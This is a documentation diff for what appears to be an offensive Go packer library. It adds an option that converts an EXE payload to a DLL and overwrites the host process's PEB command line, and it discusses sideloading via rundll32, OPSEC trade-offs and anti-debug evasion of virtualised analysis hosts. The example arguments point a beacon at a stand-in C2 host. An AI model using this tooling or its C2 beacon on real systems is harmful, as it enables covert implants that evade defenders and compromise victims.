@@ -1017,6 +1017,23 @@ out, _, err := packer.PackBinary(exe, packer.PackBinaryOptions{
 })
 ```
 
+**With operator-controlled command-line** (since v0.130.0):
+
+```go
+// Bake a default argv into the converted DLL. The payload's
+// GetCommandLineW / os.Args will return THESE bytes instead of
+// the host process's cmdline (e.g. rundll32's).
+out, _, err := packer.PackBinary(exe, packer.PackBinaryOptions{
+    Format:                     packer.FormatWindowsExe,
+    ConvertEXEtoDLL:            true,
+    ConvertEXEtoDLLDefaultArgs: "agent.exe --beacon https://c2.example/cb --jitter 30",
+    Stage1Rounds:               3,
+    Seed:                       0,
+})
+```
+
+How it works: the stub reads the existing `PEB.ProcessParameters.CommandLine.Buffer` pointer, then `REP MOVSB`s the operator-supplied wide string into that buffer in place, and rewrites `Length` / `MaximumLength`. In-place mutation is required because `kernel32!GetCommandLineW` caches its result on first call — pointer-swap alone would be invisible to anything that initialised cmdline early (Go runtime, MSVC CRT, .NET, …).
+
 | Property | Value |
 |---|---|
 | Input | PE32+ EXE (the same shapes Mode 3 accepts: Go static-PIE, mingw `-nostdlib`, …) |
@@ -1042,11 +1059,22 @@ out, _, err := packer.PackBinary(exe, packer.PackBinaryOptions{
   DllMain returns. If the host process tears down quickly
   the payload may not finish — `Sleep(INFINITE)` or proper
   thread synchronisation in your payload.
-- The EXE entry point sees `(int argc, char **argv)`
-  semantics from a non-standard launch — argv is whatever
-  the spawned thread's stack happens to hold. Payloads that
-  parse args need to fall back to `GetCommandLineW` or
-  similar.
+- Without `ConvertEXEtoDLLDefaultArgs` the payload sees the
+  HOST process's command line (rundll32 / sideload host) via
+  `GetCommandLineW` / `os.Args`, not arguments scoped to the
+  DLL. Set `ConvertEXEtoDLLDefaultArgs` (v0.130.0+) to bake an
+  operator-controlled cmdline into the stub.
+- `ConvertEXEtoDLLDefaultArgs` overflow risk: the in-place
+  rewrite assumes the loader's existing cmdline buffer is at
+  least `len(args_utf16) + 2` bytes. Typical loaders are safe
+  (rundll32 ≈ 200+ B, normal launchers ≥ 512 B), but a tiny
+  custom launcher could be overflown. Sized as wide-chars × 2
+  + 2 — keep DefaultArgs ≲ 256 wide chars for safety. There
+  is no runtime check; the asm trusts the loader's MAX.
+- The PEB-buffer rewrite is permanent for the host process —
+  the host's own subsequent `GetCommandLineW` calls also
+  return the new string. OPSEC trade-off when sideloading
+  into a process that uses its own cmdline.
 - AntiDebug runs BEFORE the SGN/CreateThread path; positive
   detection (KVM tripping the RDTSC↔CPUID delta on most
   virtualised hosts) results in a SILENT no-op DLL load —
@@ -1661,6 +1689,14 @@ opts.ConvertEXEtoDLL = true`. Input is an EXE; output is a DLL
 that LoadLibrary'd spawns the original EXE entry point on a
 new thread inside the host process. `Compress + AntiDebug`
 both supported.
+
+Optional: `opts.ConvertEXEtoDLLDefaultArgs string` (v0.130.0+)
+bakes a default command line into the stub. The DllMain
+overwrites `PEB.ProcessParameters.CommandLine.Buffer` in place
+(REP MOVSB) BEFORE invoking the OEP, so the spawned payload's
+`GetCommandLineW` / `os.Args` returns the operator-controlled
+bytes instead of the host process's cmdline. Empty string =
+no patch; payload inherits host cmdline.
 
 #### `func PackChainedProxyDLL(input []byte, opts ChainedProxyDLLOptions) (proxy, payload, key []byte, err error)` — Mode 9
 
